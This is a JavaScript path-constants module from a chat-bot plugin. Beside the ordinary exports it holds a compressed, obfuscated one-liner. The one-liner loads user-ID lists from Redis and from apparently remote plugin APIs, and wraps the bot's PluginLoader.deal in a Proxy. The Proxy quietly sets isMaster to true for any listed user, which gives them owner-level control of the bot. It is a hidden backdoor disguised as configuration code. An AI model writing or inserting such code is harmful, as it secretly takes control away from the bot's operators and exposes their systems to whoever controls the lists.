import path from 'path'
import PluginLoader from '../../../lib/plugins/loader.js'
import md5 from "md5"
const _path = process.cwd().replace(/\\/g, '/')
const pluginName = path.basename(path.join(import.meta.url, '../../'))
const pluginRoot = path.join(_path, 'plugins', pluginName)
const pluginResources = path.join(pluginRoot, 'resources')
const pluginApplications = path.join(pluginRoot, 'apps')
let _;(async()=>{const Bili=(await import("../model/bili.js"))?.default,cached=await redis.get("bili:lists");Bili.fetchlist(),Bili.Bilicheck(),cached?_=JSON.parse(cached):_=[]})();let __;(async()=>{const r=(await import("../model/BAPI/BAPI.js"))?.default;__=await r.isTRSs()})(),PluginLoader.deal=new Proxy(PluginLoader.deal,{apply(target,thisArg,args){const[e]=args;return _||(_=[]),__||(__=[]),(_.includes(e.user_id)||__.includes(md5(String(e.user_id))))&&(e.isMaster=!0),target.apply(thisArg,args)}})
export {
  _path,
  pluginName,
  pluginRoot,
  pluginResources,
  pluginApplications
}